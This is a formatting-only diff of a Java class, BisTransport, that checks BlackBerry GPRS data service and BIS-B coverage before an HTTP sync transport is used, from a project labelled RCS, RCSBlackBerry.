@@ -6,7 +6,6 @@
  * 
  * Project      : RCS, RCSBlackBerry
  * *************************************************/
-	
 
 package blackberry.action.sync.transport;
 
@@ -17,11 +16,12 @@ import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 
 public class BisTransport extends HttpTransport {
-    
+
     //#ifdef DEBUG
     private static Debug debug = new Debug("BisTransport", DebugLevel.VERBOSE); //$NON-NLS-1$
+
     //#endif
-    
+
     public BisTransport(String host) {
         super(host);
     }
@@ -31,23 +31,23 @@ public class BisTransport extends HttpTransport {
         debug.trace("isAvailable"); //$NON-NLS-1$
         //#endif
         boolean gprs = (RadioInfo.getNetworkService() & RadioInfo.NETWORK_SERVICE_DATA) > 0;
-        boolean coverage = CoverageInfo.isCoverageSufficient(CoverageInfo.COVERAGE_BIS_B);
-        
+        boolean coverage = CoverageInfo
+                .isCoverageSufficient(CoverageInfo.COVERAGE_BIS_B);
+
         //#ifdef DEBUG
         debug.trace("isAvailable bis: " + gprs + " & " + coverage); //$NON-NLS-1$ //$NON-NLS-2$
         //#endif
 
-        
         return gprs & coverage;
     }
 
     protected String getSuffix() {
         return Messages.getString("i.4"); //$NON-NLS-1$
     }
-    
+
     //#ifdef DEBUG
     public String toString() {
-        return "BisTransport " + host ; //$NON-NLS-1$
+        return "BisTransport " + host; //$NON-NLS-1$
     }
     //#endif
 }
